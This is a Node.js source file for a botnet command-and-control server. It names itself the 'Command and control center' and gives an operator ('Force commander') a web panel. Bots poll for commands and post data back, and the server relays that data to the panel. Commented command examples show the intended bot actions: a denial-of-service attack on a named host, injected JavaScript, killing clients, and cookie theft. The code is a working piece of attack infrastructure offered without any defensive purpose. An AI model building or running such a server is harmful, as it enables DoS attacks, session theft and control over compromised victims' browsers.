var express = require('express'),
    app = express(),
    http = require('http').Server(app),
    io = require('socket.io')(http),
    bodyParser = require('body-parser'),
    exphbs  = require('express-handlebars'),
    config = require('./config.json'),
    currCommand = {},
    bots = {};
//     currCommand = {DOS: {prot:'http', host: "ftp.ladder.com", port: "21" } };
//     currCommand = {injectJs: "console.log('you got hacked')" };
//    currCommand = {killClient: true };
//    currCommand = {getCookies: true };
var allowCrossDomain = function(req, res, next) {
    //    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.header("Access-Control-Allow-Headers", "X-Requested-With");
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
}

app.use(allowCrossDomain);
app.use(bodyParser.json()); // for parsing application/json
app.engine('handlebars', exphbs({defaultLayout: 'main'}));
app.use('/assets', express.static('assets'));
app.set('view engine', 'handlebars');

// express loads the homepage
app.get('/', function (req, res) {
    console.log('Requesed Force Commander')
    res.render('index', { name: 'Tobi',bots:bots,layout: false });
});
// bot get scout command
app.get('/commands/get/:id', function (req, res) {
    var id = req.params.id;
    res.json(currCommand);
    console.log('Bot : ',id, ' Request Commands: ', currCommand)
    if(!bots[id]){
        io.sockets.emit('bot-join', { id: id });
        bots[id] = true;
        console.log('New Bot: ',  id);
    }
    currCommand = {};
});
app.post('/commands/put/:id', function (req, res) {
    var id = req.params.id;
    var all = req.body;
    res.json({});
    console.log(all)
    all.id = id;
    console.log('Bot : ',id, ' Sent Data: ',all)
    //    if(bots[id]){
    io.sockets.emit('bot-data', all);
    //        console.log('New Bot: ',  id);
    //    }
});
io.on('connection', function(socket){
    console.log('Force commander connected');
    // when the force commander sends a command
    socket.on('cmd', function(cmd){
        currCommand = cmd;
        console.log(cmd);
    });
});

http.listen(config.listenPort, function(){
    console.log('Command and control center listening on http://localhost:%s', config.listenPort);
});
